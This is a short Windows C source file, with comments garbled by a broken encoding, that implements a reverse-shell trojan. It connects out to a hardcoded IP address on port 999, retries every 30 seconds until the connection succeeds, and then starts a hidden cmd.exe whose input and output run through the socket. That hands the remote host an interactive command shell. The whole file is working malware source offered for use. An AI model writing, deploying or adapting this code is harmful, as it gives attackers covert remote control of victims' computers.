// ������ľ��
// ԭ���, ֻ�Ǵӱ������ӿ��ƶ�

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
main(
    HINSTANCE  hInstance,
    HINSTANCE  hPrevInstance,
    LPSTR  lpszCmdLine,
    int  nCmdShow )
{
    WSADATA wd;
    HKEY MyKey;
    SOCKET sock;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    struct sockaddr_in sin;
    char buffer[MAX_PATH], cmd[MAX_PATH], *p,
         IP[16] = "12.1.40.149\x00";    //������ַ12.1.40.149
    unsigned short port = 999;    // �����˿�999
    memset(&si, 0, sizeof(si));
    WSAStartup(MAKEWORD( 1, 1 ), &wd);
    sock = WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(IP);
    while ( connect(sock, (struct sockaddr *)&sin, sizeof (sin)) ) Sleep (30000);
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE; //���ش���
    si.hStdInput = si.hStdOutput = si.hStdError = (void *)sock; //���ùܵ���������dos����
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, 0, NULL, &si, &pi ); //��������
    return 0;
}
